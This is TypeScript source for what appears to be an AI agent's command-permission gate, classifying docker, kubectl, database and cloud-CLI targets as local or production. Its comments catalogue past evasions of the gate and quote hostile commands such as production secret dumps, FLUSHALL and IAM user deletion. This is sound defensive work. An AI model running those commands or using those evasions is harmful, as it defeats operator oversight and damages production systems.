/** The five names in `k8s_local_contexts` that are the CONTAINER RUNTIME's own words for the local daemon.
 *  Kubernetes has no such convention: a kubeconfig context called `default` is whatever the operator's file
 *  says, and `kubectl --context default apply -f evil.yaml` was read as local because the container list and the
 *  Kubernetes list are one file (exit review 7). */
const CONTAINER_ONLY_LOCAL = new Set(['default', 'unix', 'npipe', 'rootless', 'desktop-windows']);
const k8sContexts = (targets: LocalTargets): string[] =>
  targets.k8sLocalContexts.filter((c) => !CONTAINER_ONLY_LOCAL.has(c));

/** Resolves the Kubernetes target of a normalized segment and whether the verb mutates it. */
/** docker/podman global options that consume the next token, so their value is not the subcommand. */
const DOCKER_GLOBAL_VALUE_OPTS =
  /^(--log-level|-l|--config|--tlscacert|--tlscert|--tlskey|--context|-c|--host|-H|--url|--connection|--builder|--identity|--runtime|--namespace|--remote|--storage-driver)$/;

/**
 * Which ENGINE a container command talks to. Only an EXPLICIT selection is classified: `-H`/`--host`,
 * `-c`/`--context`, podman `--url`/`--connection`, and `docker context use <name>`, which changes the engine every
 * later command will use. A command with no explicit selection keeps the accepted product decision — running a
 * container on the local default daemon is ALLOW — and the residual risk of an ambient context is recorded in
 * docs/architecture/phase-1-residuals.md rather than guessed at here.
 */
function resolveContainerTarget(
  tokens: string[],
  targets: LocalTargets,
  envInputs: Record<string, string> = {},
): { cls: TargetClass; target: string; mutating: boolean } {
  const signals: Array<{ cls: TargetClass; target: string }> = [];
  const add = (v: string, kind: string) => {
    // the local daemon, however it is spelled, is local: a unix socket, a named pipe, or a loopback endpoint.
    // THE HOST IS COMPARED WHOLE. A substring test made every endpoint that merely CONTAINS a local name local:
    // `tcp://[fd00:acme:prod::1]:2375` contains `::1` and `tcp://prod-localhost.acme.com:2375` contains
    // `localhost`, so a production engine was read as the local daemon (exit review 4).
    if (/^(unix:|npipe:|fd:)/i.test(v) || targets.dbLocalHosts.some((h) => endpointHost(v) === h || v === h))
      // (endpointHost cuts the authority at the first `/`, `?` or `#`, so a fragment cannot fake the host)
      signals.push({ cls: 'LOCAL', target: `${kind} ${v}` });
    else if (isOpaqueTarget(v)) signals.push({ cls: 'UNCLASSIFIED', target: `${kind} ${v}` });
    else signals.push({ cls: classifyTargetName(v, targets.k8sLocalContexts, targets), target: `${kind} ${v}` });
  };
  for (let i = 1; i < tokens.length; i++) {
    const t = tokens[i]!;
    // these are GLOBAL options: they come before the subcommand. Past it, `-c` is the container's own flag —
    // `docker run --rm alpine sh -c "echo hi"` is ordinary work and was being DENIED as a remote engine. A
    // global option that TAKES a value must have its value skipped, not treated as the subcommand, or
    // `docker --log-level debug -H tcp://prod …` stopped the scan before the engine (exit review 2).
    if (!t.startsWith('-')) {
      if (i > 1 && DOCKER_GLOBAL_VALUE_OPTS.test(tokens[i - 1] ?? '')) continue;
      break;
    }
    // THE CLIENT CONFIG DIRECTORY SELECTS THE ENGINE. `docker --config DIR` reads DIR/config.json for the current
    // context, and `podman --remote` switches to a connection named in a file: both were skipped as opaque option
    // noise, so a production daemon reached ALLOW (exit review 6). Neither file can be read from here, so the
    // target is UNCLASSIFIED — never local.
    if (t === '--config' || t === '--remote' || t === '-r' || /^--config=/.test(t))
      signals.push({ cls: 'UNCLASSIFIED', target: `client configuration ${t}` });
    const eq = /^(?:--host=|--context=|--url=|--connection=|--builder=|-H|-c)(.+)$/.exec(t);
    if ((t === '-H' || t === '--host' || t === '--url') && tokens[i + 1]) add(tokens[++i]!, 'engine');
    else if ((t === '-c' || t === '--context' || t === '--connection') && tokens[i + 1]) add(tokens[++i]!, 'context');
    else if (eq) add(eq[1]!, t.startsWith('-H') || t.startsWith('--host') || t.startsWith('--url') ? 'engine' : 'context');
  }
  // the engine is selected by ENVIRONMENT too — `DOCKER_HOST` and `DOCKER_CONTEXT` are the same two flags by
  // another name, and docker's own help documents `--context` as overriding `DOCKER_HOST`
  const engineEnv = (k: string, v: string): void => {
    if (/^(DOCKER_HOST|CONTAINER_HOST)$/.test(k)) add(v, 'engine');
    else if (k === 'DOCKER_CONTEXT') add(v, 'context');
    // `BUILDX_BUILDER` selects the builder exactly as `--builder` does, and buildx ships the build context to it
    else if (k === 'BUILDX_BUILDER') add(v, 'builder');
  };
  for (const [k, v] of Object.entries(envInputs)) engineEnv(k, v);
  // …and as a TOKEN, because that is how the normalizer re-attaches a target assignment it stripped from the
  // head. Reading only `envInputs` meant the re-attachment reached the resolver and was ignored by it, which is
  // the "accepted but unconsumed" defect one layer down (exit review 6, generated cross-product).
  for (const t of tokens) {
    const eq = /^([A-Za-z_][A-Za-z0-9_]*)=(.*)$/.exec(t);
    if (eq) engineEnv(eq[1]!, eq[2]!.replace(/^['"]|['"]$/g, ''));
  }
  // `--builder` is unambiguous wherever it sits, and buildx puts it after the plugin subcommand, past the
  // global-option scan above (exit review 2)
  for (let i = 1; i < tokens.length; i++) {
    const t = tokens[i]!;
    const eq = /^--builder=(.+)$/.exec(t);
    if (t === '--builder' && tokens[i + 1]) add(tokens[++i]!, 'builder');
    else if (eq) add(eq[1]!, 'builder');
  }
  // `docker context use <name>` re-points every later command at that engine
  const useIdx = tokens.findIndex((t, i) => t === 'use' && tokens[i - 1] === 'context');
  if (useIdx > 0 && tokens[useIdx + 1]) add(tokens[useIdx + 1]!, 'context use');
  // ...AND SO DO ITS THREE SIBLINGS, which were not modelled at all (exit review 7):
  //   `podman system connection add|default NAME [URI]` writes containers.conf — the same name-to-engine binding
  //     `docker context create` writes, and `add` makes the first connection the default;
  //   `docker buildx create --driver remote <endpoint> --use` binds a remote BuildKit daemon and selects it, with
  //     the endpoint as a POSITIONAL that the dedicated `--builder` scan cannot see;
  //   `docker buildx use NAME` selects an already-bound builder.
  // Every later build or run then goes there with no flag naming it, so nothing downstream can be re-targeted.
  const sysConn = tokens.findIndex((t, i) => /^(add|default)$/.test(t) && tokens[i - 1] === 'connection');
  if (sysConn > 0) for (const t of tokens.slice(sysConn + 1)) if (!t.startsWith('-')) add(t, 'podman connection');
  const bxCreate = tokens.findIndex((t, i) => t === 'create' && tokens[i - 1] === 'buildx');
  if (bxCreate > 0) {
    const driver = tokens.findIndex((t, i) => t === '--driver' && i > bxCreate);
    if (driver > 0 && /^(remote|kubernetes)$/.test(tokens[driver + 1] ?? '')) {
      const endpoint = tokens.slice(driver + 2).find((t) => !t.startsWith('-'));
      add(endpoint ?? 'an unnamed remote endpoint', 'buildx driver');
    }
  }
  const bxUse = tokens.findIndex((t, i) => t === 'use' && tokens[i - 1] === 'buildx');
  if (bxUse > 0) {
    const name = tokens.slice(bxUse + 1).find((t) => !t.startsWith('-'));
    if (name) add(name, 'buildx use');
  }
  if (!signals.length) return { cls: 'LOCAL', target: 'local daemon', mutating: false };
  // A READ against another engine is not a mutation of it: `docker -H … ps` lists, it does not deploy. But a
  // MANAGEMENT GROUP is not a verb — `image` and `context` name a whole family whose members mutate, so treating
  // the group as a read let `docker --context production image rm|prune|load` reach ALLOW against a production
  // engine (exit review 4). When the first positional is a group, the verb is the pair.
  // `inspect` and `logs` PRINT the container's configuration and output — its environment variables, its mounts
  // and whatever it logged, which is where credentials live. Against a non-local engine that is an act on it,
  // exactly as `kubectl get secrets` is against a cluster (exit review 8).
  const reads = new Set(['ps', 'images', 'version', 'info', 'top', 'port', 'stats', 'events', 'history', 'diff', 'search']);
  const groupReads = new Set([
    ...['image ls', 'image inspect', 'image history', 'image save', 'image tree'],
    ...['container ls', 'container inspect', 'container logs', 'container port', 'container stats', 'container top', 'container diff'],
    ...['volume ls', 'volume inspect', 'network ls', 'network inspect', 'system info', 'system df', 'system events'],
    ...['context ls', 'context inspect', 'context show', 'builder ls', 'buildx ls', 'buildx inspect'],
    ...['node ls', 'node inspect', 'service ls', 'service inspect', 'service logs', 'service ps'],
    ...['stack ls', 'stack ps', 'stack services', 'secret ls', 'secret inspect', 'config ls', 'config inspect'],
    ...['plugin ls', 'plugin inspect', 'compose ls', 'compose ps', 'compose logs', 'compose config', 'compose images', 'compose top'],
  ]);
  const groups = new Set(['image', 'container', 'volume', 'network', 'system', 'context', 'builder', 'buildx', 'node', 'service', 'stack', 'secret', 'config', 'plugin', 'trust', 'swarm', 'compose', 'manifest', 'checkpoint']);
  // A SIGNAL'S TARGET IS A VALUE, NOT A SUFFIX. The filter dropped every positional that the target string
  // merely ENDS WITH, so `docker --context staging-run run -d …` lost its own verb — `context staging-run`
  // ends with `run` — and a container started on a non-local engine reached ALLOW (exit review 7).
  const signalValues = new Set(signals.map((g) => g.target.slice(g.target.indexOf(' ') + 1)));
  const positional = tokens.slice(1).filter((t) => !t.startsWith('-') && !signalValues.has(t));
  const first = positional[0];
  const verb = first !== undefined && groups.has(first) && positional[1] !== undefined ? `${first} ${positional[1]}` : first;
  const isUse =
    tokens.some((t, i) => t === 'use' && tokens[i - 1] === 'context') ||
    bxUse > 0 ||
    bxCreate > 0 ||
    sysConn > 0;
  const mutating = isUse || verb === undefined || !(reads.has(verb) || groupReads.has(verb));
  const worst = signals.reduce((a, b) => (TARGET_SEVERITY[b.cls] > TARGET_SEVERITY[a.cls] ? b : a));
  return { ...worst, mutating };
}

function resolveK8sTarget(
  tokens: string[],
  targets: LocalTargets,
): { cls: TargetClass; target: string; mutating: boolean } {
  const head = tokens[0] ?? '';
  if (/^(kind|k3d|minikube)$/.test(head)) return { cls: 'LOCAL', target: head, mutating: true };
  // `kustomize build|cfg|fn` RENDERS: it reads kustomization.yaml and writes YAML to stdout, opening no
  // kubeconfig and contacting no cluster, so there is no target to be unclassified about (exit review 7)
  if (head === 'kustomize' && /^(build|cfg|fn|version|edit)$/.test(tokens[1] ?? ''))
    return { cls: 'LOCAL', target: 'a local render', mutating: false };
  // The verb is found BY NAME, not by skipping option values: any global option missing from a skip-list would
  // otherwise displace it and silently turn a mutation into a read (round 14).
  const known = head === 'helm' ? HELM_VERBS : KUBECTL_VERBS;
  // READING A PRODUCTION CLUSTER'S SECRETS IS NOT A READ THIS MODEL MAY WAVE THROUGH. The target model escalates
  // only MUTATING verbs, so `kubectl --context production get secrets -o yaml` — a full credential dump — reached
  // ALLOW under a capability named k8s.local.apply (exit review 6). A secret is the one resource whose READ is an
  // effect on its own.
  // `secrets/db` is `TYPE/NAME` exactly as `secret/db` is, and only the singular slash form was listed, so
  // `kubectl --context production get secrets/db -o yaml` dumped a production Secret's data block at ALLOW
  // (exit review 7).
  const touchesSecrets =
    // kubectl accepts a COMMA-SEPARATED resource list: `get secrets,configmaps` reads both (exit review 8)
    (head === 'kubectl' && tokens.some((t) => t.split(',').some((r) => /^secrets?(\/.+)?$/i.test(r)))) ||
    // `helm get values|all|manifest|notes|hooks` PRINTS THE RENDERED RELEASE, which carries whatever the chart
    // templated — database URLs, tokens, the contents of every Secret it defines. Against a production cluster
    // that is a credential dump, exactly as `kubectl get secrets` is, and it was ALLOW because `get` is a read
    // verb and the target model escalates only mutations (exit review 7).
    (head === 'helm' && tokens.includes('get') && tokens.some((t) => /^(values|all|manifest|notes|hooks)$/.test(t)));
  const mutate = head === 'helm' ? HELM_MUTATING_VERBS : K8S_MUTATING_VERBS;
  let verb: string | undefined;
  for (let i = 1; i < tokens.length; i++) {
    const t = tokens[i]!;
    if (t.startsWith('-')) {
      if (K8S_VALUE_OPTS.test(t)) i++; // its value is a namespace/context/file, never the verb
      continue;
    }
    if (known.has(t)) {
      verb = t;
      break;
    }
  }
  // an unrecognised verb fails closed: the kernel cannot show it is a read. And `config use-context` is not a
  // read of anything — it re-points every LATER command at that cluster, which is the effect that matters.
  const switchesContext = tokens.some((t, i) => t === 'use-context' && tokens[i - 1] === 'config');
  // READING A CLUSTER'S SECRETS IS AN EFFECT ON ITS OWN. The target model escalates only MUTATING verbs, so
  // `kubectl --context production get secrets -o yaml` — a full credential dump from a production cluster —
  // reached ALLOW under a capability literally named k8s.local.apply (exit review 6). A secret is the one
  // resource whose READ has to be treated as an act against the cluster it is read from.
  const mutating = switchesContext || touchesSecrets || verb === undefined ? true : mutate.has(verb);
  // EVERY signal that can select the cluster is classified, and the MOST RESTRICTIVE one decides. kubectl resolves
  // them together — `--server` overrides the context's endpoint and `--kubeconfig` chooses the file the context is
  // looked up in — so a local-looking `--context` must never end the search (round 14).
  const signals: Array<{ cls: TargetClass; target: string }> = [];
  const add = (values: string[], patterns: string[], kind: string) => {
    for (const v of values) signals.push({ cls: classifyTargetName(v, patterns, targets), target: `${kind} ${v}` });
  };
  // `kubectl config use-context X` re-points every later command at that cluster, exactly as `docker context
  // use` does — and that one was already classified (exit review 3).
  const useIdx = tokens.findIndex((t, i) => t === 'use-context' && tokens[i - 1] === 'config');
  if (useIdx > 0 && tokens[useIdx + 1]) add([tokens[useIdx + 1]!], k8sContexts(targets), 'context use');
  add(optionValues(tokens, '', ['--context', '--kube-context']), k8sContexts(targets), 'context');
  // A NAMED LOCAL CONTEXT IS DECISIVE. `kind get kubeconfig > ./kube.conf` then `kubectl --kubeconfig ./kube.conf
  // --context kind-dev apply` is the documented kind workflow; the FILE is UNCLASSIFIED (the kernel cannot read
  // it) and outranked the context, so the whole local loop was DENIED (exit review 7). A kubeconfig says where
  // contexts are listed; the `--context` says which one is used, and when that one is local there is nothing
  // left for the file to change.
  const namedContext = optionValues(tokens, '', ['--context', '--kube-context']);
  const contextIsLocal =
    namedContext.length > 0 &&
    namedContext.every((c) => classifyTargetName(c, k8sContexts(targets), targets) === 'LOCAL') &&
    // ...and only for a kubeconfig the WORKSPACE owns. `kind get kubeconfig > ./kube.conf` writes it into the
    // checkout; a file somewhere else is one the kernel cannot read and did not see created, and a pinned
    // bypass rests on exactly that (`--kubeconfig /tmp/remote.yaml --context kind-dev`, round 14).
    optionValues(tokens, '', ['--kubeconfig']).every((f) => !isAbsolute(f) && !f.startsWith('~'));
  // a kubeconfig FILE is unreadable to the kernel, so it is UNCLASSIFIED — unless the `--context` already names a
  // local cluster, in which case the file only says where that name is listed
  if (!contextIsLocal) add(optionValues(tokens, '', ['--kubeconfig']), [], 'kubeconfig');
  for (const t of tokens) {
    const env = /^(KUBECONFIG|KUBERNETES_MASTER)=(.+)$/.exec(t);
    if (env) signals.push({ cls: classifyTargetName(env[2]!, [], targets), target: env[1]! + '=' + env[2]! });
    // helm reads its context from the environment too, and `HELM_KUBECONTEXT=production helm upgrade` was a
    // production release nobody saw (exit review 7)
    const ctxEnv = /^(HELM_KUBECONTEXT|KUBE_CONTEXT|HELM_KUBEAPISERVER)=(.+)$/.exec(t);
    if (ctxEnv)
      signals.push({
        cls: classifyTargetName(ctxEnv[2]!, k8sContexts(targets), targets),
        target: `${ctxEnv[1]!}=${ctxEnv[2]!}`,
      });
  }
  // THE API SERVER IS AN ENDPOINT, so its HOST is what decides — `--server https://127.0.0.1:6443` names the
  // loopback cluster explicitly and was read as an opaque name, denying the very thing the local list exists to
  // allow (exit review 7).
  for (const v of optionValues(tokens, 's', ['--server', '--kube-apiserver'])) {
    const host = endpointHost(v);
    signals.push({
      cls: classifyTargetName(host, targets.dbLocalHosts, targets),
      target: `server ${v}`,
    });
  }
  for (const ns of optionValues(tokens, 'n', ['--namespace']))
    if (!isOpaqueTarget(ns) && hasProductionMarker(ns, targets.productionMarkers))
      signals.push({ cls: 'PRODUCTION', target: `namespace ${ns}` });
  if (signals.length === 0)
    return { cls: 'UNCLASSIFIED', target: 'the ambient kubeconfig context', mutating };
  const worst = signals.reduce((a, b) => (TARGET_SEVERITY[b.cls] > TARGET_SEVERITY[a.cls] ? b : a));
  return { cls: worst.cls, target: worst.target, mutating };
}

/** Resolves the database target of a normalized segment and whether a statement is executed against it. */
/** Bind-mount sources of a container run: `-v SRC:DST`, `--volume SRC:DST`, `--mount type=bind,source=SRC,...`.
 *  Handing a host path to a container reads and writes it, so the source is classified like any other path. */
export function containerMountSources(tokens: string[]): string[] {
  const out: string[] = [];
  for (const v of optionValues(tokens, 'v', ['--volume'])) {
    const src = v.split(':')[0];
    if (src && (src.startsWith('/') || src.startsWith('~') || src.startsWith('.') || src.startsWith('$')))
      out.push(src);
  }
  for (const m of tokens.join(' ').matchAll(/--mount[= ]\s*([^\s]+)/g)) {
    const spec = m[1]!;
    if (!/type=bind/.test(spec)) continue;
    const src = /(?:^|,)(?:source|src)=([^,\s]+)/.exec(spec)?.[1];
    if (src) out.push(src);
  }
  return out;
}

/** A word that can only be a connection target: a URI, or a host-shaped name with a path or a port. SQL words
 *  and table names never look like this, which is what lets the statement scan stop at one. */
function looksLikeDbTarget(t: string): boolean {
  if (/^[a-z][a-z0-9+.-]*:\/\//i.test(t)) return true;
  // `prod-mongo/admin` is `host/database` with no dot in it at all, which is how mongosh is normally invoked
  if (/^[A-Za-z0-9][A-Za-z0-9._-]*(:\d+)?\/[A-Za-z0-9._-]+$/.test(t) && !/\.(sql|js|py|rb|json|txt|sh)$/i.test(t))
    return true;
  return /^[A-Za-z0-9][A-Za-z0-9.-]*\.[A-Za-z][A-Za-z0-9-]*(:\d+)?(\/\S*)?$/.test(t) && !/\.(sql|js|py|rb|json|txt)$/i.test(t);
}

function resolveDbTarget(
  tokens: string[],
  targets: LocalTargets,
  envInputs: Record<string, string> = {},
): { cls: TargetClass; target: string; executes: boolean } {
  const head = tokens[0] ?? '';
  // Whether a statement is "executed" is not guessed any more. A client pointed at a non-local database is an
  // external effect whatever it then types: the statement can arrive by flag, by positional argument, by file, by
  // stdin redirect, or interactively (round 14 found all five spellings escaping the flag test).
  const executes = true;
  // sqlite3 operates on a file: the path rules already govern it
  if (head === 'sqlite3') return { cls: 'LOCAL', target: tokens[1] ?? '(memory)', executes };
  const signals: Array<{ cls: TargetClass; target: string }> = [];
  const push = (v: string, kind: string) =>
    signals.push({ cls: classifyTargetName(v, targets.dbLocalHosts, targets), target: `${kind} ${v}` });

  // THE CLIENT READS THE ENVIRONMENT WHEN NO HOST IS ON THE LINE. libpq reads `PGHOST`, mysql reads `MYSQL_HOST`,
  // redis-cli reads `REDIS_HOST`; with none of them the client uses the local socket, which is why "no host
  // token" returned LOCAL. `resolveContainerTarget` and `resolveCloudTarget` both take `envInputs` for exactly
  // this reason and this one did not, so a production host named only in the environment was read as the local
  // socket (exit review 7).
  for (const [k, v] of Object.entries(envInputs))
    if (/^(PGHOST|PGHOSTADDR|MYSQL_HOST|REDIS_HOST|CLICKHOUSE_HOST|KUBERNETES_MASTER)$/.test(k)) push(v, `${k}=`);
    else if (/^(PGURI|REDIS_URL|MONGODB_URI|MONGO_URL|DATABASE_URL|FLYWAY_URL)$/.test(k))
      push(endpointHost(v.replace(/^jdbc:/, '')), `${k}=`);
    else if (k === 'PGSERVICE') signals.push({ cls: 'UNCLASSIFIED', target: `PGSERVICE=${v}` });

  // `\c [DBNAME [USER [HOST [PORT]]]]` RECONNECTS THE SESSION, so everything after it runs on that host. The
  // host is a WORD INSIDE a `-c` value, not a token of the command line, and only the short `\c - - HOST` form
  // happened to work — because there the host is also the value's last word, which the bare-token scan below
  // reaches. The fully spelled form put a database and a user in front of it and escaped (exit review 7).
  // the backslash is consumed by tokenization (it is an escape wherever the shell did not keep it), so the
  // meta-command survives as the bare word `c`/`connect` immediately after psql's `-c`
  const connAt = tokens.findIndex(
    (t, i) => /^\\?c(onnect)?$/.test(t) && /^(-c|--command|-f|--file)$/.test(tokens[i - 1] ?? ''),
  );
  if (connAt >= 0) {
    const words = tokens.slice(connAt + 1, connAt + 5);
    // `\c DBNAME USER HOST PORT`: the third word is the host, and `-` means "keep the current one"
    if (words[2] !== undefined && words[2] !== '-') push(words[2], '\\connect host');
  }

  for (const t of tokens) {
    // a URI anywhere in the token, not only at its start: `-url=jdbc:postgresql://prod-db/app` hid the host
    for (const m of t.matchAll(/[a-z][a-z0-9+.-]*:\/\/(?:[^@/\s]*@)?\[?([^\]:/?\s]+)\]?/gi)) {
      if (isOpaqueTarget(m[0]!)) signals.push({ cls: 'UNCLASSIFIED', target: m[0]! });
      else push(m[1] ?? '', 'uri host');
    }
    // A QUERY PARAMETER OVERRIDES THE URI HOST. libpq reads `postgres://localhost/app?host=prod-db.acme.com` and
    // connects to prod-db: the authority is ignored when `host=` is given, so reading only the authority let a
    // production database reach ALLOW (exit review 6).
    for (const m of t.matchAll(/[?&](host|hostaddr|server)=([^&\s"']+)/gi)) push(m[2]!, 'uri parameter host');
    // an environment variable that selects the server, re-attached by normalizeSegment
    const env = /^(PGHOST|PGHOSTADDR|MYSQL_HOST|REDIS_HOST|CLICKHOUSE_HOST)=(.+)$/.exec(t);
    if (env) push(env[2]!, env[1]! + '=');
    if (/^(PGSERVICE|PGURI|DATABASE_URL|REDIS_URL|MONGODB_URI|MONGO_URL)=/.test(t) && !/:\/\//.test(t))
      signals.push({ cls: 'UNCLASSIFIED', target: t.split('=')[0]! });
    // libpq / MySQL keyword-value conninfo: `psql "host=db.acme.com dbname=app"` names the host without a URI
    for (const m of t.matchAll(/(?:^|[\s"'])host(?:addr)?\s*=\s*([^\s"';]+)/gi)) push(m[1]!, 'conninfo host');
    // a service name resolves through a file the kernel cannot read: unknowable, so never local
    if (/(?:^|[\s"'])service\s*=/i.test(t) || t === '--service' || t.startsWith('--service='))
      signals.push({ cls: 'UNCLASSIFIED', target: 'a connection service name' });
    // A CONNECTION PROFILE named on the command line resolves through a client option file the kernel never reads
    // — `~/.my.cnf`, the obfuscated `~/.mylogin.cnf`, a cqlshrc. Same rule as `service=`: an EXPLICIT reference to
    // an unreadable profile is never local. The IMPLICIT default option file is deliberately NOT a signal, since
    // no evidence is on the command line and gating a bare `psql` would gate the ordinary inner loop.
    if (/^--(defaults-file|defaults-extra-file|login-path|defaults-group-suffix|cqlshrc|config-file)(=|$)/.test(t))
      signals.push({ cls: 'UNCLASSIFIED', target: 'a client connection profile' });
  }
  for (const h of optionValues(tokens, 'h', ['--host'])) push(h, 'host');
  // `redis-cli --cluster <subcommand> <host:port> …` names the node as a LATER positional — the bare-operand scan
  // below stops at the subcommand and never reaches it, so `--cluster call prod-cache-01:6379 FLUSHALL` was the
  // local socket (exit review 4). `--cluster` is matched EXACTLY, so `--cluster-mode` and the `--cluster-from`
  // family are untouched, and only a real `host:port` counts, so a key that contains a colon is not a host.
  if (/^(redis-cli|valkey-cli)$/.test(head.slice(head.lastIndexOf('/') + 1))) {
    const clusterAt = tokens.indexOf('--cluster');
    if (clusterAt >= 0)
      for (let i = clusterAt + 2; i < tokens.length; i++) {
        // The node list is CONTIGUOUS and ends at the first operand that is not a node; everything after it is
        // the redis COMMAND and its KEYS. Scanning to the end of the line instead read a key shaped `prod:1` as a
        // production node and turned an ordinary `--cluster call localhost:7000 SET prod:1 x` into an absolute
        // deny nobody could approve.
        if (!/^(\[[^\]\s]+\]|[A-Za-z0-9][A-Za-z0-9.-]*):\d+$/.test(tokens[i]!)) break;
        push(endpointHost(tokens[i]!), 'cluster node');
      }
  }
  // the first operand that is not an option NOR an option's value
  let bare: string | undefined;
  for (let i = 1; i < tokens.length; i++) {
    const t = tokens[i]!;
    if (t.startsWith('-')) {
      // THE STATEMENT IS ONE WORD, and the quoting that said so is gone by the time this scan runs. Skipping a
      // single token after `-c` left the rest of the SQL to be read as operands, so `psql -c 'select * from
      // users'` found the bare operand `*` and called the target unclassified — the most ordinary query there is,
      // against the local socket, interrupting the agent for approval (exit review 7). Everything up to the next
      // option belongs to the statement.
      if (/^(-c|--command|-e|--execute|--eval|--query)$/.test(t)) {
        // ...but it stops at a CONNECTION TARGET. The statement is one quoted word whose quoting is gone by
        // now, so the scan runs to the next option — and `mongosh --eval '…' prod-mongo.acme.com/app` puts the
        // host AFTER the statement, where the scan swallowed it (exit review 8).
        while (i + 1 < tokens.length && !tokens[i + 1]!.startsWith('-') && !looksLikeDbTarget(tokens[i + 1]!)) i++;
        continue;
      }
      if (/^(-f|--file|-U|--username|-p|--port|-d|--dbname|-o|--output)$/.test(t)) i++;
      continue;
    }
    bare = t;
    break;
  }
  if (signals.length === 0 && bare && isOpaqueTarget(bare))
    return { cls: 'UNCLASSIFIED', target: bare, executes };
  // mongosh/psql/mysql accept a bare `host[:port][/db]` with no scheme at all — but a filename is not a host
  const FILE_EXT = /\.(sql|js|mjs|cjs|ts|json|txt|csv|sh|py|rb|dump|bak|gz|zip|db|sqlite3?)$/i;
  if (
    signals.length === 0 &&
    bare &&
    !FILE_EXT.test(bare) &&
    looksLikeDbTarget(bare)
  )
    push(bare.split(/[:/]/)[0]!, 'host');
  if (signals.length === 0) return { cls: 'LOCAL', target: 'the local socket', executes };
  const worst = signals.reduce((a, b) => (TARGET_SEVERITY[b.cls] > TARGET_SEVERITY[a.cls] ? b : a));
  return { cls: worst.cls, target: worst.target, executes };
}

/** Re-judges a capability that ASSERTS a local target against the target the command actually names (Q98). */
/** CLIs whose verdict this resolver may lower. `terraform`, `pulumi` and `vault` share these capabilities through
 *  the same matchers and have no endpoint flag, so an unknown-flag de-escalation there would be pure loss. */
const CLOUD_CLI_HEADS = new Set(['aws', 'gcloud', 'az']);
/** endpoint options, in the spellings the three CLIs really accept */
const CLOUD_ENDPOINT_OPT_RE =
  /^--(endpoint-url|endpoint|blob-endpoint|queue-endpoint|table-endpoint|file-endpoint|api-endpoint-overrides)$/;

/** Which system a cloud CLI acts on. THE DEFAULT IS PRODUCTION: with no endpoint a cloud CLI talks to the real
 *  provider, so the mirror of the k8s/db rule "never guess local" is "no evidence keeps the deny". The host is
 *  compared WHOLE through `endpointHost` + `classifyTargetName`, never as a substring — that is how
 *  `prod-localhost.acme.com` and `[fd00:acme:prod::1]` defeated the container resolver in exit review 4. */
function resolveCloudTarget(
  tokens: string[],
  targets: LocalTargets,
  envInputs: Record<string, string> = {},
): { cls: TargetClass; target: string } {
  const raw = tokens[0] ?? '';
  if (!CLOUD_CLI_HEADS.has(raw.slice(raw.lastIndexOf('/') + 1)))
    return { cls: 'PRODUCTION', target: 'not a cloud CLI' };
  const signals: Array<{ cls: TargetClass; target: string }> = [];
  const add = (v: string, kind: string) =>
    signals.push(
      isOpaqueTarget(v)
        ? { cls: 'UNCLASSIFIED', target: `${kind} ${v}` }
        : { cls: classifyTargetName(endpointHost(v), targets.dbLocalHosts, targets), target: `${kind} ${v}` },
    );
  for (let i = 1; i < tokens.length; i++) {
    const t = tokens[i]!;
    const eq = /^(--[a-z-]+)=(.*)$/.exec(t);
    if (eq && CLOUD_ENDPOINT_OPT_RE.test(eq[1]!)) add(eq[2]!, 'endpoint');
    else if (CLOUD_ENDPOINT_OPT_RE.test(t) && tokens[i + 1]) add(tokens[++i]!, 'endpoint');
  }
  // AN ENDPOINT VARIABLE BELONGS TO ONE VENDOR. `AWS_ENDPOINT_URL` says nothing about what `gcloud` will talk to,
  // and letting any of them de-escalate any cloud CLI would let an unrelated assignment lower an absolute deny.
  const vendor = raw.slice(raw.lastIndexOf('/') + 1);
  const vendorEnv =
    vendor === 'aws'
      ? /^(AWS_ENDPOINT_URL(_[A-Z0-9_]+)?|AWS_S3_ENDPOINT)$/
      : vendor === 'gcloud'
        ? /^(CLOUDSDK_API_ENDPOINT_OVERRIDES_[A-Z0-9_]+|(STORAGE|PUBSUB|FIRESTORE|DATASTORE|BIGTABLE|SPANNER)_EMULATOR_HOST)$/
        : /^AZURE_[A-Z0-9_]*ENDPOINT[A-Z0-9_]*$/;
  // ...AND A SERVICE-SCOPED ONE BELONGS TO ONE SERVICE. `AWS_ENDPOINT_URL_S3` points the S3 client at an
  // emulator and says NOTHING about IAM, yet `AWS_ENDPOINT_URL_S3=http://localhost:4566 aws iam delete-user`
  // took the de-escalation and an absolute core deny arrived as ASK; `PUBSUB_EMULATOR_HOST=localhost:8085
  // gcloud compute instances delete` did the same with a product that has no emulator at all (exit review 7).
  // The unscoped `AWS_ENDPOINT_URL` still covers every service, which is what LocalStack really does and what
  // the de-escalation exists for.
  const service = tokens.slice(1).find((t) => !t.startsWith('-'))?.toLowerCase() ?? '';
  const scopeOf = (name: string): string | null => {
    const aws = /^AWS_ENDPOINT_URL_([A-Z0-9_]+)$/.exec(name);
    if (aws) return aws[1]!.toLowerCase().replace(/_/g, '-');
    if (name === 'AWS_S3_ENDPOINT') return 's3';
    const emu = /^(STORAGE|PUBSUB|FIRESTORE|DATASTORE|BIGTABLE|SPANNER)_EMULATOR_HOST$/.exec(name);
    if (emu) return emu[1]!.toLowerCase();
    const sdk = /^CLOUDSDK_API_ENDPOINT_OVERRIDES_([A-Z0-9_]+)$/.exec(name);
    if (sdk) return sdk[1]!.toLowerCase().replace(/_/g, '-');
    return null;
  };
  for (const [k, v] of Object.entries(envInputs)) {
    if (!vendorEnv.test(k)) continue;
    const scope = scopeOf(k);
    // the service names differ between the variable and the command line in a few places gcloud spells out
    const aliases: Record<string, string[]> = {
      storage: ['storage', 'gcs', 'gsutil'],
      pubsub: ['pubsub'],
      firestore: ['firestore'],
      datastore: ['datastore'],
      bigtable: ['bigtable'],
      spanner: ['spanner'],
    };
    if (scope !== null && service !== '' && !(aliases[scope] ?? [scope]).includes(service)) continue;
    add(v, `${k}=`);
  }
  if (!signals.length) return { cls: 'PRODUCTION', target: 'the provider default endpoint' };
  return signals.reduce((a, b) => (TARGET_SEVERITY[b.cls] > TARGET_SEVERITY[a.cls] ? b : a));
}

function retargetLocalCapability(
  table: CompiledAuthorityTable,
  ctx: EvaluationContext,
  hit: CapabilityHit,
  norm: string,
  envInputs: Record<string, string> = {},
): CapabilityHit {
  const kind =
    TARGET_SENSITIVE[hit.capability] ??
    TARGET_SENSITIVE_HEAD.find(([re]) => re.test(commandHead(norm)))?.[1];
  if (!kind) return hit;
  const targets = table.localTargets;
  if (!targets || targets.k8sLocalContexts.length === 0) return hit;
  const tokens = tokenize(norm);
  // THE ONE DE-ESCALATION IN THE KERNEL, and it is deliberately separate from the escalate-only tail below. For
